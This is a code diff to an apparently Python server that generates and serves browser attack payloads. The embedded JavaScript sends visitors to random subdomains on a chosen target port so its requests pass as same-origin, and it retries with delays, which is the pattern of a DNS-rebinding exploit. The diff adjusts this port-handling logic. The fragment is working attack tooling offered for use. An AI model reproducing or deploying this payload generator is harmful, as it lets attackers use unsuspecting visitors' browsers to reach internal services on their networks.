@@ -107,7 +107,7 @@ class PayloadGenerator:
     
     <script>
     const CONFIG = {{
-        targetPort: {target_port},
+        targetPort: window.location.port || {target_port} || 80,
         targetPath: '{target_path}',
         delayMs: {delay_ms},
         maxAttempts: 30,
@@ -117,11 +117,18 @@ class PayloadGenerator:
     // Check if we need to redirect to unique subdomain for same-origin fetch
     const baseDomain = window.location.hostname.split('.').slice(-2).join('.');
     const currentHost = window.location.hostname;
+    const currentPort = window.location.port || '80';
     
-    // If we're not on a random subdomain yet, redirect to one
-    if (!currentHost.startsWith('r') || currentHost.split('.').length < 3) {{
+    // If we're not on a random subdomain yet, OR not on target port, redirect
+    const needsRedirect = !currentHost.startsWith('r') || 
+                          currentHost.split('.').length < 3 || 
+                          currentPort !== String(CONFIG.targetPort);
+    
+    if (needsRedirect) {{
         const uniqueHost = 'r' + Math.random().toString(36).slice(2, 10) + '.' + baseDomain;
-        const newUrl = 'http://' + uniqueHost + ':' + window.location.port + window.location.pathname + window.location.search;
+        // Redirect to TARGET PORT so fetch is same-origin
+        const newUrl = 'http://' + uniqueHost + ':' + CONFIG.targetPort + window.location.pathname + window.location.search;
+        console.log('Redirecting to: ' + newUrl);
         window.location.href = newUrl;
         throw new Error('Redirecting...');
     }}
@@ -565,7 +572,8 @@ class PayloadPage(resource.Resource):
         args = {k.decode(): v[0].decode() for k, v in request.args.items()}
         
         if self.path == 'single':
-            port = int(args.get('port', 80))
+            # Port auto-detected from URL, fallback to param, fallback to 80
+            port = int(args.get('port', 80))  # Only used as JS fallback
             path = args.get('path', '/')
             delay = int(args.get('delay', 3000))
             
